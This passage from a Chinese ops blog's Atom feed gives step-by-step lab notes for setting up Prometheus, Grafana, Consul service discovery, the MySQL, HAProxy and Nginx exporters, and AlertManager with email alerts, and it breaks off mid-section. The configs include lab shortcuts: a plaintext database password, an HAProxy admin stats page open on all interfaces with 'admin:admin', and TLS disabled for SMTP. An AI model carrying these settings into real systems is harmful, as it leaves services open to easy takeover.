<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Deops&#39;s blog</title>
  
  <subtitle>运维开发工程师</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://marnm.github.io/"/>
  <updated>2022-09-03T05:38:41.272Z</updated>
  <id>https://marnm.github.io/</id>
  
  <author>
    <name>Echo</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Prometheus学习笔记</title>
    <link href="https://marnm.github.io//posts/39c0f6a1/"/>
    <id>https://marnm.github.io//posts/39c0f6a1/</id>
    <published>2022-06-28T09:19:36.000Z</published>
    <updated>2022-09-03T05:38:41.272Z</updated>
    
    <content type="html"><![CDATA[<h2 id="&#x4E8C;&#x8FDB;&#x5236;&#x5B89;&#x88C5;"><a href="#&#x4E8C;&#x8FDB;&#x5236;&#x5B89;&#x88C5;" class="headerlink" title="&#x4E8C;&#x8FDB;&#x5236;&#x5B89;&#x88C5;"></a>&#x4E8C;&#x8FDB;&#x5236;&#x5B89;&#x88C5;</h2><p><strong>Download Prometheus Binary Pakcage</strong></p><pre><code class="bash">curl -O --progress http://192.168.210.200/0221-note/prometheus-2.36.2.linux-amd64.tar.gztar zxvf prometheus-2.36.2.linux-amd64.tar.gz -C /opt/mv prometheus-2.36.2.linux-amd64/ prometheus-2.36.2cd /opt/prometheus-2.36.2/vim /etc/systemd/system/prometheus.service</code></pre><a id="more"></a><p><strong>Create Systemctl start file</strong></p><pre><code class="ini">[Unit]Description=PrometheusWants=network-online.targetAfter=network-online.target[Service]User=prometheusGroup=prometheusType=simpleExecStart=/opt/prometheus-2.36.2/prometheus \    --config.file /opt/prometheus-2.36.2/prometheus.yml \    --storage.tsdb.path /var/lib/prometheus/ \    --web.console.templates=/opt/prometheus-2.36.2/consoles \    --web.console.libraries=/opt/prometheus-2.36.2/console_libraries[Install]WantedBy=multi-user.target</code></pre><p><strong>Configure Prometheus</strong></p><pre><code class="bash">useradd --no-create-home --bash /bin/false prometheususeradd --no-create-home --bash /bin/false node_exportermkdir mkdir /var/lib/prometheuschown prometheus:prometheus /opt/prometheus-2.36.2/chown prometheus:prometheus /var/lib/prometheus/systemctl daemon-reloadsystemctl start prometheussystemctl status prometheussystemctl enable prometheus</code></pre><pre><code class="bash">[root@server12 opt]# netstat -pantul | grep prometheustcp6       0      0 :::9090                 :::*                    LISTEN      4556/prometheustcp6       0      0 ::1:9090                ::1:49814               ESTABLISHED 4556/prometheustcp6       0      0 ::1:49814               ::1:9090                ESTABLISHED 4556/prometheus[root@server12 opt]#</code></pre><h3 id="&#x4E8C;&#x8FDB;&#x5236;&#x5B89;&#x88C5;node-exporter"><a href="#&#x4E8C;&#x8FDB;&#x5236;&#x5B89;&#x88C5;node-exporter" class="headerlink" title="&#x4E8C;&#x8FDB;&#x5236;&#x5B89;&#x88C5;node_exporter"></a>&#x4E8C;&#x8FDB;&#x5236;&#x5B89;&#x88C5;node_exporter</h3><p><strong>Download node-exporter</strong></p><pre><code class="bash"> curl -O --progress http://192.168.210.200/0221-note/node_exporter-1.3.1.linux-amd64.tar.gz tar zxvf node_exporter-1.3.1.linux-amd64.tar.gz -C /opt/ mv node_exporter-1.3.1.linux-amd64/ node_exporter-1.3.1 cd node_exporter-1.3.1/ systemctl stop prometheus systemctl status prometheus</code></pre><p> <strong>Create systemctl start file mangement node-exporter</strong></p><pre><code class="bash"> vim /etc/systemd/system/node_exporter.service</code></pre><pre><code class="ini"> [Unit]Description=Prometheus Node ExporterAfter=network.target[Service]ExecStart=/opt/node_exporter-1.3.1/node_exporter[Install]WantedBy=multi-user.target</code></pre><pre><code class="bash">systemctl daemon-reloadsystemctl start node_exportersystemctl status node_exportersystemctl enable node_exporter</code></pre><h2 id="rpm&#x5B89;&#x88C5;grafana"><a href="#rpm&#x5B89;&#x88C5;grafana" class="headerlink" title="rpm&#x5B89;&#x88C5;grafana"></a>rpm&#x5B89;&#x88C5;grafana</h2><pre><code class="bash">curl -O --progress http://192.168.210.200/0221-note/grafana-enterprise-8.5.6-1.x86_64.rpmyum install -y fontconfig urw-base35 urw-fontsrpm -ivh grafana-enterprise-8.5.6-1.x86_64.rpm</code></pre><p><strong>&#x4FEE;&#x6539;&#x914D;&#x7F6E;&#x6587;&#x4EF6;</strong></p><pre><code class="vim">vim /etc/grafana/grafana.ini</code></pre><p>&#x53BB;&#x6389;&#x76F8;&#x5173;&#x6CE8;&#x91CA;</p><pre><code class="ini">#################################### Server ####################################[server]# Protocol (http, https, h2, socket)protocol = http# The ip address to bind to, empty will bind to all interfaceshttp_addr = 0.0.0.0# The http port  to usehttp_port = 3000....&#x7701;&#x7565;.........</code></pre><pre><code class="bash">systemctl start grafana-server</code></pre><h2 id="Prometheus&#x57FA;&#x4E8E;Consul&#x7684;&#x670D;&#x52A1;&#x53D1;&#x73B0;"><a href="#Prometheus&#x57FA;&#x4E8E;Consul&#x7684;&#x670D;&#x52A1;&#x53D1;&#x73B0;" class="headerlink" title="Prometheus&#x57FA;&#x4E8E;Consul&#x7684;&#x670D;&#x52A1;&#x53D1;&#x73B0;"></a>Prometheus&#x57FA;&#x4E8E;Consul&#x7684;&#x670D;&#x52A1;&#x53D1;&#x73B0;</h2><p><strong>&#x4E0B;&#x8F7D;&#x5B89;&#x88C5;consul</strong>  </p><pre><code class="bash">curl -O --progress http://192.168.210.200/0221-note/consul_1.12.2_linux_amd64.zipunzip consul_1.12.2_linux_amd64.zip -d /usr/local/bin/</code></pre><p><strong>&#x4E0E;Prometheus&#x96C6;&#x6210;</strong>  </p><pre><code class="bash">mkdir /etc/consulmkdir /var/lib/consul#&#x521B;&#x5EFA;&#x914D;&#x7F6E;&#x6587;&#x4EF6;vim /etc/consul/nodes1.json</code></pre><pre><code class="json">{  &quot;services&quot;: [    {      &quot;id&quot;: &quot;node_exporter-node01&quot;,      &quot;name&quot;: &quot;node01&quot;,      &quot;address&quot;: &quot;192.168.73.11&quot;,      &quot;port&quot;: 9100,      &quot;tags&quot;: [&quot;nodes&quot;],      &quot;checks&quot;: [{        &quot;http&quot;: &quot;http://192.168.73.11:9100/metrics&quot;,        &quot;interval&quot;: &quot;5s&quot;      }]    },    {      &quot;id&quot;: &quot;node_exporter-node02&quot;,      &quot;name&quot;: &quot;node02&quot;,      &quot;address&quot;: &quot;192.168.73.12&quot;,      &quot;port&quot;: 9100,      &quot;tags&quot;: [&quot;prometheus&quot;],      &quot;checks&quot;: [{        &quot;http&quot;: &quot;http://192.168.73.12:9100/metrics&quot;,        &quot;interval&quot;: &quot;5s&quot;      }]    }  ]}</code></pre><p><strong>&#x4FEE;&#x6539;Prometheus&#x914D;&#x7F6E;</strong></p><pre><code class="yaml"># my global configglobal:  scrape_interval: 15s # Set the scrape interval to every 15 seconds. Default is every 1 minute.  evaluation_interval: 15s # Evaluate rules every 15 seconds. The default is every 1 minute.alerting:  alertmanagers:    - static_configs:        - targets:          # - alertmanager:9093rule_files:scrape_configs:  - job_name: &quot;prometheus&quot;  # /etc/consul/nodes1.json&#x91CC;&#x7684;tags&#x91CC;&#x7684;&#x53C2;&#x6570;&#x6709;&#x624D;&#x884C;    consul_sd_configs:    - server: &quot;192.168.73.12:8500&quot;  # &#x6539;&#x6210;&#x81EA;&#x5DF1;&#x7684;IP      tags:      - &quot;prometheus&quot;      refresh_interval: 10s  - job_name: &apos;nodes&apos;    consul_sd_configs:    - server: &quot;192.168.73.12:8500&quot;  # &#x6539;&#x6210;&#x81EA;&#x5DF1;&#x7684;IP      tags:      - &quot;nodes&quot;      refresh_interval: 5s</code></pre><p><strong>&#x68C0;&#x67E5;Prometheus&#x914D;&#x7F6E;&#x662F;&#x5426;&#x6B63;&#x786E;</strong></p><pre><code class="bash">./promtool check config ./prometheus.ymlChecking ./prometheus.yml SUCCESS: ./prometheus.yml is valid prometheus config file syntax[root@server12 prometheus-2.36.2]#</code></pre><p><strong>&#x540E;&#x53F0;&#x8FD0;&#x884C;Consul</strong></p><pre><code class="bash"> nohup consul agent -server -bootstrap -bind=192.168.73.12 -client=192.168.73.12 -data-dir=/var/lib/consul -config-dir=/etc/consul -ui -node=192.168.73.12 &amp; # &#x56DE;&#x8F66;</code></pre><p><strong>&#x91CD;&#x542F;Prometheus</strong></p><pre><code class="bash">systemctl restart prometheus</code></pre><p><strong>consul&#x65E5;&#x5FD7;</strong></p><pre><code>consul agent -dev -data-dir=/data/consul -config-dir=/etc/consul -ui</code></pre><p><strong>&#x5199;&#x5165;&#x6D4B;&#x8BD5;&#x6570;&#x636E;</strong></p><pre><code class="bash">curl -X PUT -d &apos;{&quot;id&quot;:&quot;node-exporter11&quot;,&quot;name&quot;:&quot;node-exporter11&quot;,&quot;address&quot;:&quot;192.168.73.11&quot;,&quot;port&quot;:9100,&quot;tags&quot;:[&quot;node-exporter&quot;],&quot;checks&quot;:[{&quot;http&quot;:&quot;http://192.168.73.11:9100/&quot;,&quot;interval&quot;: &quot;5s&quot;}]}&apos; http://192.168.73.11:8500/v1/agent/service/registercurl -X PUT -d &apos;{&quot;id&quot;:&quot;node-exporter12&quot;,&quot;name&quot;:&quot;node-exporter12&quot;,&quot;address&quot;:&quot;192.168.73.12&quot;,&quot;port&quot;:9100,&quot;tags&quot;:[&quot;node-exporter&quot;],&quot;checks&quot;:[{&quot;http&quot;:&quot;http://192.168.73.12:9100/&quot;,&quot;interval&quot;: &quot;5s&quot;}]}&apos; http://192.168.73.12:8500/v1/agent/service/register# &#x4E0A;&#x9762;&#x7684;IP&#x5730;&#x5740;&#x6539;&#x6210;&#x81EA;&#x5DF1;&#x7684;# curl&#x5E38;&#x7528;&#x53C2;&#x6570;# -X/--request  &#x6307;&#x5B9A;&#x4EC0;&#x4E48;&#x6307;&#x4EE4;&#xFF08;&#x8BF7;&#x6C42;&#xFF09;[GET|POST|PUT|DELETE|...] &#x6307;&#x5B9A;HTTP method&#x53D1;&#x51FA;&#x6307;&#x5B9A;&#x7684;request# -d/--data &quot;XX=XXXX...&quot; &#x8BBE;&#x5B9A;HTTP&#x53C2;&#x6570;# -H/--header &quot;XX:XXX&quot; &#x8BBE;&#x5B9A;request&#x7684;header# -i/--include &#x663E;&#x793A;response&#x7684;header# -v/--verbose &#x663E;&#x793A;&#x7EA4;&#x8BE6;&#x7EC6;&#x4FE1;&#x606F;# -u/--user  &quot;XX:XXX&quot; &#x4F7F;&#x7528;&#x8005;&#x8D26;&#x53F7;&#x5BC6;&#x7801;# -b/--cookie cookie&#x6587;&#x4EF6;&#x8DEF;&#x5F84;&#x4F7F;&#x7528;cookie</code></pre><hr><h2 id="&#x4F7F;&#x7528;Consul&#x76D1;&#x63A7;MySQL"><a href="#&#x4F7F;&#x7528;Consul&#x76D1;&#x63A7;MySQL" class="headerlink" title="&#x4F7F;&#x7528;Consul&#x76D1;&#x63A7;MySQL"></a>&#x4F7F;&#x7528;Consul&#x76D1;&#x63A7;MySQL</h2><blockquote><p>MySQL Exporter &#x662F;&#x7528;&#x6765;&#x91C7;&#x96C6; MySQL/MariaDB &#x6570;&#x636E;&#x5E93;&#x76D1;&#x63A7;&#x6307;&#x6807;&#x800C;&#x8BBE;&#x8BA1;&#x5F00;&#x53D1;&#x7684;&#xFF0C;&#x901A;&#x8FC7; Exporter &#x4E0A;&#x62A5;&#x6838;&#x5FC3;&#x7684;&#x6570;&#x636E;&#x5E93;&#x6307;&#x6807;&#xFF0C;&#x7528;&#x4E8E;&#x5F02;&#x5E38;&#x62A5;&#x8B66;&#x548C;&#x76D1;&#x63A7;&#x5927;&#x76D8;&#x5C55;&#x793A;&#xFF0C;&#x4E91;&#x76D1;&#x63A7; Prometheus &#x63D0;&#x4F9B;&#x4E86;&#x4E0E; MySQL Exporter &#x96C6;&#x6210;&#x53CA;&#x5F00;&#x7BB1;&#x5373;&#x7528;&#x7684; Grafana &#x76D1;&#x63A7;&#x5927;&#x76D8;&#x3002;</p></blockquote><p><strong>&#x5B89;&#x88C5;&#x6570;&#x636E;&#x5E93;</strong><br>MySQL/MariaDB&#x90FD;&#x53EF;&#x4EE5;</p><pre><code class="bash"># &#x5B89;&#x88C5;yum install -y mariadb-server# &#x542F;&#x52A8;systemctl start mariadb# &#x521D;&#x59CB;&#x5316;mysql_secure_installation</code></pre><p><strong>&#x6388;&#x6743;&#x76D1;&#x63A7;&#x8D26;&#x6237;&#x6743;&#x9650;</strong></p><pre><code class="sql">CREATE USER &apos;mysql_exporter&apos;@&apos;localhost&apos; IDENTIFIED BY &apos;imnot007*&apos;;GRANT PROCESS, REPLICATION CLIENT, SELECT ON *.* TO &apos;mysql_exporter&apos;@&apos;localhost&apos;;flush privileges;</code></pre><p><strong>&#x5C1D;&#x8BD5;&#x767B;&#x5F55;&#x521B;&#x5EFA;&#x7684;&#x8D26;&#x6237;</strong></p><pre><code class="bash">mysql -umysql_exporter -pimnot007* -hlocalhost</code></pre><p><strong>&#x4E0B;&#x8F7D;&#x5B89;&#x88C5;mysql_exporter</strong>  </p><pre><code class="bash">curl -O --progress http://192.168.210.200/0221-note/mysqld_exporter-0.14.0.linux-amd64.tar.gztar xf mysqld_exporter-0.14.0.linux-amd64.tar.gz -C /opt/cd /opt/mysqld_exporter-0.14.0.linux-amd64/cp mysqld_exporter /usr/local/bin/ </code></pre><p><strong>&#x514D;&#x5BC6;&#x7801;&#x767B;&#x5F55;&#x914D;&#x7F6E;&#xFF1A;</strong></p><pre><code class="bash">vim /etc/my.cnf</code></pre><p>&#x6DFB;&#x52A0;&#x5982;&#x4E0B;&#x914D;&#x7F6E;&#xFF1A;</p><pre><code class="ini">[client]user=mysql_exporterpassword=imnot007*</code></pre><p><strong>&#x521B;&#x5EFA;systemd&#x7BA1;&#x7406;mysql expoter</strong></p><pre><code class="bash">vim /etc/systemd/system/mysqld_exporter.service</code></pre><pre><code class="ini">[Unit]Description=Prometheus Node ExporterAfter=network.target[Service]# &#x4E0B;&#x9762;&#x7684;my.cnf&#x6539;&#x6210;&#x81EA;&#x5DF1;&#x7684;&#x76EE;&#x5F55;ExecStart=/usr/local/bin/mysqld_exporter --config.my-cnf=/etc/my.cnf[Install]WantedBy=multi-user.target</code></pre><pre><code class="bash">systemctl daemon-reloadsystemctl start mysqld_exportersystemctl enable mysqld_exporter</code></pre><p><strong>&#x68C0;&#x67E5;mysqld expoter&#x662F;&#x5426;&#x542F;&#x52A8;</strong></p><pre><code class="xml">[root@server11 mysqld_exporter-0.14.0.linux-amd64]# netstat -pantul | grep 9104tcp6       0      0 :::9104                 :::*                    LISTEN      12982/mysqld_export[root@server11 mysqld_exporter-0.14.0.linux-amd64]#</code></pre><p><strong>&#x4FEE;&#x6539;Consul&#x914D;&#x7F6E;</strong></p><pre><code>vim /etc/consul/nodes1.json</code></pre><pre><code class="json">{  &quot;services&quot;: [    {      &quot;id&quot;: &quot;node_exporter-node01&quot;,      &quot;name&quot;: &quot;node01&quot;,      &quot;address&quot;: &quot;192.168.73.11&quot;,      &quot;port&quot;: 9100,      &quot;tags&quot;: [&quot;nodes&quot;],      &quot;checks&quot;: [{        &quot;http&quot;: &quot;http://192.168.73.11:9100/metrics&quot;,        &quot;interval&quot;: &quot;5s&quot;      }]    },    {      &quot;id&quot;: &quot;node_exporter-node02&quot;,      &quot;name&quot;: &quot;node02&quot;,      &quot;address&quot;: &quot;192.168.73.12&quot;,      &quot;port&quot;: 9100,      &quot;tags&quot;: [&quot;prometheus&quot;],      &quot;checks&quot;: [{        &quot;http&quot;: &quot;http://192.168.73.12:9100/metrics&quot;,        &quot;interval&quot;: &quot;5s&quot;      }]    },    {      &quot;id&quot;: &quot;mysql-monitor-172.31.2.182&quot;,      &quot;name&quot;: &quot;mysql&quot;,      &quot;address&quot;: &quot;192.168.73.11&quot;,      &quot;port&quot;: 9104,      &quot;tags&quot;: [&quot;mysql&quot;],      &quot;checks&quot;: [{        &quot;http&quot;: &quot;http://192.168.73.12:9100/metrics&quot;,        &quot;interval&quot;: &quot;5s&quot;      }]    }  ]}</code></pre><p>&#x91CD;&#x542F;Consul</p><pre><code>nohup consul agent -server -bootstrap -bind=192.168.73.12 -client=192.168.73.12 -data-dir=/var/lib/consul -config-dir=/etc/consul -ui -node=192.168.73.12 &amp;</code></pre><p><strong>&#x4FEE;&#x6539;Prometheus&#x914D;&#x7F6E;</strong></p><pre><code class="yaml">global:  scrape_interval: 15s # Set the scrape interval to every 15 seconds. Default is every 1 minute.  evaluation_interval: 15s # Evaluate rules every 15 seconds. The default is every 1 minute.  # scrape_timeout is set to the global default (10s).# Alertmanager configurationalerting:  alertmanagers:    - static_configs:        - targets:          # - alertmanager:9093# Load rules once and periodically evaluate them according to the global &apos;evaluation_interval&apos;.rule_files:  # - &quot;first_rules.yml&quot;  # - &quot;second_rules.yml&quot;# Here it&apos;s Prometheus itself.scrape_configs:  - job_name: &quot;prometheus&quot;    consul_sd_configs:    - server: &quot;192.168.73.12:8500&quot;      tags:      - &quot;prometheus&quot;      refresh_interval: 10s  - job_name: &apos;nodes&apos;    consul_sd_configs:    - server: &quot;192.168.73.12:8500&quot;      tags:      - &quot;nodes&quot;      refresh_interval: 5s# &#x8FD9;&#x91CC;&#xFF1A;  - job_name: &apos;mysql&apos;    consul_sd_configs:    - server: &quot;192.168.73.12:8500&quot;      tags:      - &quot;mysql&quot;      refresh_interval: 5s[root@server12 prometheus-2</code></pre><p>&#x91CD;&#x542F;Prometheus</p><h2 id="&#x4F7F;&#x7528;Consul&#x76D1;&#x63A7;HAProxy"><a href="#&#x4F7F;&#x7528;Consul&#x76D1;&#x63A7;HAProxy" class="headerlink" title="&#x4F7F;&#x7528;Consul&#x76D1;&#x63A7;HAProxy"></a>&#x4F7F;&#x7528;Consul&#x76D1;&#x63A7;HAProxy</h2><p><strong>&#x5B89;&#x88C5;HAProxy&#x548C;web&#x670D;&#x52A1;</strong></p><pre><code class="bash">yum install haproxyyum install -y nginxsystemctl start nginxsystemctl enable nginx</code></pre><p><strong>&#x4FEE;&#x6539; socket &#x6587;&#x4EF6;</strong></p><pre><code class="bash">vim /etc/haproxy/haproxy.cfg</code></pre><blockquote><p># &#x4FEE;&#x6539;&#x7B2C;36&#x884C;&#xFF1A;<br>stats socket /var/lib/haproxy/haproxy.sock mode 600 level admin</p></blockquote><p><strong>&#x91CD;&#x542F;HAProxy</strong></p><pre><code>systemctl restart haproxysystemctl status haproxy</code></pre><p><strong>&#x4E0B;&#x8F7D;&#x914D;&#x7F6E;HAProxy Expoter</strong><br>&#x4E0B;&#x8F7D;&#x5730;&#x5740;&#xFF1A;<a href="https://github.com/prometheus/haproxy_exporter/releases/tag/v0.13.0" target="_blank" rel="noopener">https://github.com/prometheus/haproxy_exporter/releases/tag/v0.13.0</a></p><pre><code class="bash">tar zxf haproxy_exporter-0.13.0.linux-amd64.tar.gz -C /opt/cd /opt/haproxy_exporter-0.13.0.linux-amd64/cp haproxy_exporter /usr/local/bin/</code></pre><p><strong>&#x4FEE;&#x6539;HAProxy&#x914D;&#x7F6E;</strong></p><pre><code class="bash">vim /etc/haproxy/haproxy.cfg</code></pre><pre><code class="ini"># &#x5728;59&#x884C;&#x4E0B;&#x6DFB;&#x52A0;&#xFF1A;listen stats    bind 0.0.0.0:8080    mode http    maxconn 10    timeout connect         30s    timeout client          30s    timeout server          30s    stats enable    stats refresh 30s    stats uri /stats    stats realm Haproxy Manager    stats auth admin:admin    stats hide-version    stats admin if TRUE#...#...# &#x5728;&#x7B2C;95&#x884C;&#x4E0B;&#x4FEE;&#x6539;&#x5982;&#x4E0B;backend app     balance     roundrobin     server  nginx12 192.168.73.12:80    cookie  server1 weight  6   inter   2000    rise    2   fall    3     server  nginx11 192.168.73.12:80    cookie  server2 weight  6   inter   2000    rise    2   fall    3</code></pre><p>&#x91CD;&#x542F;HAProxy</p><pre><code>systemctl restart haproxy</code></pre><p><strong>&#x8FD0;&#x884C;haproxy expoter</strong>  </p><pre><code>haproxy_exporter --haproxy.scrape-uri=unix:/var/lib/haproxy/haproxy.sock</code></pre><p><strong>Prometheus&#x76D1;&#x63A7;HAProxy</strong></p><pre><code class="yaml"># &#x5728;&#x672B;&#x5C3E;&#x6DFB;&#x52A0;&#x5982;&#x4E0B;&#x914D;&#x7F6E;  - job_name: &apos;haproxy&apos;    static_configs:    - targets: [&apos;192.168.73.11:9101&apos;]</code></pre><p>&#x91CD;&#x542F;Prometheus</p><hr><h2 id="Prometheus&#x76D1;&#x63A7;Nginx"><a href="#Prometheus&#x76D1;&#x63A7;Nginx" class="headerlink" title="Prometheus&#x76D1;&#x63A7;Nginx"></a>Prometheus&#x76D1;&#x63A7;Nginx</h2><p><strong>&#x83B7;&#x53D6;Nginx&#x865A;&#x62DF;&#x4E3B;&#x673A;&#x6D41;&#x91CF;&#x72B6;&#x6001;&#x6A21;&#x5757;nginx-module-vts</strong><br>&#x6A21;&#x5757;&#x9879;&#x76EE;&#x5730;&#x5740;&#xFF1A;<a href="https://github.com/vozlt/nginx-module-vts" target="_blank" rel="noopener">https://github.com/vozlt/nginx-module-vts</a>  </p><pre><code class="bash">cd /usr/local/src/git clone git://github.com/vozlt/nginx-module-vts.git</code></pre><p><strong>&#x6E90;&#x7801;&#x7F16;&#x8BD1;&#x5B89;&#x88C5;Nginx</strong>  </p><pre><code class="bash">./configure --with-http_v2_module --with-http_ssl_module --with-http_sub_module --with-http_stub_status_module --with-http_gzip_static_module --with-pcre --with-http_realip_module --with-pcre --with-file-aio --with-stream --with-stream_ssl_module --with-stream_realip_module --add-module=/usr/local/src/nginx-module-vtsmake &amp;&amp; make install</code></pre><p><strong>&#x4FEE;&#x6539;Nginx&#x914D;&#x7F6E;</strong></p><pre><code class="nginx">http {......        vhost_traffic_status_zone;        vhost_traffic_status_filter_by_host on;......    server {        location /metrics {            vhost_traffic_status_display;            vhost_traffic_status_display_format html;        }    }}</code></pre><p><strong>&#x521B;&#x5EFA;SystemD&#x7BA1;&#x7406;Nginx</strong></p><pre><code class="bash">vim /etc/systemd/system/nginx.service</code></pre><pre><code class="ini">[Unit]Description=The nginx HTTP and reverse proxy serverAfter=network-online.target remote-fs.target nss-lookup.targetWants=network-online.target[Service]Type=forkingPIDFile=/usr/local/nginx/logs/nginx.pid# Nginx will fail to start if /run/nginx.pid already exists but has the wrong# SELinux context. This might happen when running `nginx -t` from the cmdline.# https://bugzilla.redhat.com/show_bug.cgi?id=1268621ExecStartPre=/usr/bin/rm -f /usr/local/nginx/logs/nginx.pidExecStartPre=/usr/sbin/nginx -tExecStart=/usr/sbin/nginxExecReload=/usr/sbin/nginx -s reloadKillSignal=SIGQUITTimeoutStopSec=5KillMode=processPrivateTmp=true[Install]WantedBy=multi-user.target</code></pre><pre><code class="bash">systemctl daemon-reloadsystemctl start nginx</code></pre><p><strong>Nginx Exporter&#x914D;&#x7F6E;</strong><br>Nginx VTS Exporter&#x4E0B;&#x8F7D;&#x5730;&#x5740;&#xFF1A; <a href="https://github.com/hnlq715/nginx-vts-exporter" target="_blank" rel="noopener">https://github.com/hnlq715/nginx-vts-exporter</a>  </p><pre><code class="bash">tar zxf nginx-vts-exporter-0.10.3.linux-amd64.tar.gz -C /opt/cd /opt/nginx-vts-exporter-0.10.3.linux-amd64/nohup ./nginx-vts-exporter -nginx.scrape_uri=http://0.0.0.0/metrics/format/json &amp;</code></pre><p><strong>Prometheus&#x76D1;&#x63A7;Nginx</strong></p><pre><code class="yaml">- job_name: nginx    scrape_interval: 15s    static_configs:    - targets: [&apos;192.168.73.3:9913&apos;]      labels:        instance: Nginx_A    - targets: [&apos;192.168.5.11:9913&apos;]      labels:        instance: Nginx_B</code></pre><p>&#x91CD;&#x542F;Prometheus</p><hr><h2 id="Prometheus&#x914D;&#x7F6E;AlertManager"><a href="#Prometheus&#x914D;&#x7F6E;AlertManager" class="headerlink" title="Prometheus&#x914D;&#x7F6E;AlertManager"></a>Prometheus&#x914D;&#x7F6E;AlertManager</h2><blockquote><p>AlertManager&#x7528;&#x4E8E;&#x76D1;&#x63A7;&#x544A;&#x8B66;<br>&#x670D;&#x52A1;&#x51FA;&#x73B0;&#x6545;&#x969C;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;AlertManager&#x901A;&#x77E5;&#x7EF4;&#x62A4;&#x8005;<br>&#x53EF;&#x4EE5;&#x662F;&#x53D1;&#x9001;&#x90AE;&#x4EF6;&#x901A;&#x77E5;&#x7EF4;&#x62A4;&#x8005;&#x3001;&#x6216;&#x8005;&#x901A;&#x8FC7;&#x4F01;&#x4E1A;&#x5FAE;&#x4FE1;&#x3001;&#x9489;&#x9489;&#x53D1;&#x9001;&#x4FE1;&#x606F;&#x7ED9;&#x7EF4;&#x62A4;&#x8005;  </p></blockquote><p><strong>&#x4E0B;&#x8F7D;&#x5B89;&#x88C5;</strong></p><pre><code class="bash">curl -O --progress http://192.168.210.200/0221-note/alertmanager-0.24.0.linux-amd64.tar.gztar -zxf alertmanager-0.24.0.linux-amd64.tar.gz -C /opt/cd /optmv alertmanager-0.24.0.linux-amd64/ alertmanager-0.24.0mkdir /run/alertmanageruseradd -rs /bin/false alertmanagerchown alertmanager:alertmanager /opt/alertmanager-0.24.0/*chown -R alertmanager:alertmanager /run/alertmanagervim /etc/systemd/system/alertmanager.service</code></pre><pre><code class="ini">[Unit]Description=Alert ManagerWants=network-online.targetAfter=network-online.target[Service]Type=simpleUser=alertmanagerGroup=alertmanagerExecStart=/opt/alertmanager-0.24.0/alertmanager \  --config.file=/opt/alertmanager-0.24.0/alertmanager.yml \  --storage.path=/run/alertmanagerRestart=always[Install]WantedBy=multi-user.target</code></pre><pre><code class="bash">systemctl daemon-reloadsystemctl restart alertmanagersystemctl status alertmanagersystemctl enable alertmanager</code></pre><p><strong>&#x4FEE;&#x6539;AlertManager&#x914D;&#x7F6E;</strong><br>&#x5148;&#x53BB;&#x81EA;&#x5DF1;&#x7684;&#x90AE;&#x7BB1;&#x83B7;&#x53D6;&#x4E00;&#x4E2A;&#x6388;&#x6743;&#x5BC6;&#x7801;</p><pre><code class="bash">vim /opt/alertmanager-0.24.0/alertmanager.yml</code></pre><p>&#x53C2;&#x8003;&#x914D;&#x7F6E;&#xFF1A;</p><pre><code class="yaml">global:  resolve_timeout: 1m  smtp_smarthost: &apos;smtp.qq.com:465&apos; # 163&#x90AE;&#x7BB1;&#x8BF7;&#x4F7F;&#x7528;smtp.163.com  smtp_from: &apos;fnaichu@qq.com&apos; # &#x4FEE;&#x6539;&#x4E3A;&#x81EA;&#x5DF1;&#x7684;&#x90AE;&#x7BB1;  smtp_auth_username: &apos;fnaichu@qq.com&apos; # &#x4FEE;&#x6539;&#x4E3A;&#x81EA;&#x5DF1;&#x7684;&#x90AE;&#x7BB1;  smtp_auth_password: &apos;&#x8FD9;&#x91CC;&#x7C98;&#x8D34;&#x83B7;&#x53D6;&#x5230;&#x7684;&#x6388;&#x6743;&#x7801;&apos;  smtp_hello: &apos;@qq.com&apos; # 163.com  smtp_require_tls: falseroute:  group_by: [&apos;alertname&apos;]  group_wait: 10s  group_interval: 2m  repeat_interval: 5m  receiver: &apos;web.hook&apos;receivers:  - name: &apos;web.hook&apos;    email_configs:    - to: &apos;fnaichu@qq.com&apos; # &#x4FEE;&#x6539;&#x4E3A;&#x81EA;&#x5DF1;&#x7684;&#x90AE;&#x7BB1;      send_resolved: true    #webhook_configs:          #- url: &apos;http://127.0.0.1:5001/&apos;inhibit_rules:  - source_match:      severity: &apos;critical&apos;    target_match:      severity: &apos;warning&apos;    equal: [&apos;alertname&apos;, &apos;dev&apos;, &apos;instance&apos;]</code></pre><p><strong>&#x68C0;&#x67E5;AlertManager&#x914D;&#x7F6E;</strong><br><em>&#x63D0;&#x793A;&#xFF1A;Checking &#x2018;alertmanager.yml&#x2019;  SUCCESS&#x5219;&#x914D;&#x7F6E;&#x6B63;&#x786E;</em></p><pre><code class="bash">./amtool check-config ./alertmanager.ymlChecking &apos;./alertmanager.yml&apos;  SUCCESSFound: - global config - route - 1 inhibit rules - 1 receivers - 0 templates[root@server12 alertmanager-0.24.0]#</code></pre><p><strong>&#x914D;&#x7F6E;AlertManager&#x89C4;&#x5219;&#xFF1A;</strong></p><pre><code class="bash">mkdir /opt/prometheus-2.36.2/rulesvim /opt/prometheus-2.36.2/rules/server_rules.yaml</code></pre><pre><code class="yaml">groups:  - name: alertmanager_pod.rules    rules:    - alert: &quot;node &#x5185;&#x5B58;&#x53EF;&#x7528;&#x5927;&#x5C0F;&quot;      expr: node_memory_MemFree_bytes &gt; 1 #&#x6545;&#x610F;&#x5199;&#x9519;&#x7684;      for: 15s      labels:        severity: critical      annotations:        description: &quot;&#x8282;&#x70B9;&#x53EF;&#x7528;&#x5185;&#x5B58;&#x5C0F;&#x4E8E; 100k&quot;</code></pre><p><strong>&#x4FEE;&#x6539;Prometheus&#x914D;&#x7F6E;</strong></p><pre><code class="bash">vim /opt/prometheus-2.36.2/prometheus.yml</code></pre><p><strong>&#x5728;&#x5DF2;&#x6709;&#x7684;&#x914D;&#x7F6E;&#x4E0A;&#x4FEE;&#x6539;&#xFF1A;</strong></p><pre><code class="yaml">alerting:  alertmanagers:    - static_configs:        - targets:          # - alertmanager:9093          - 192.168.73.12:9093# Load rules once and periodically evaluate them according to the global &apos;evaluation_interval&apos;.rule_files:  # - &quot;first_rules.yml&quot;  # - &quot;second_rules.yml&quot;  - ./rules/server_rules.yaml</code></pre><hr><h2 id="Prometheus&#x914D;&#x7F6E;pushgateway"><a href="#Prometheus&#x914D;&#x7F6E;pushgateway" class="headerlink" title="Prometheus&#x914D;&#x7F6E;pushgateway"></a>Prometheus&#x914D;&#x7F6E;pushgateway</h2><blockquote><p>PushGateway &#x4F5C;&#x4E3A; 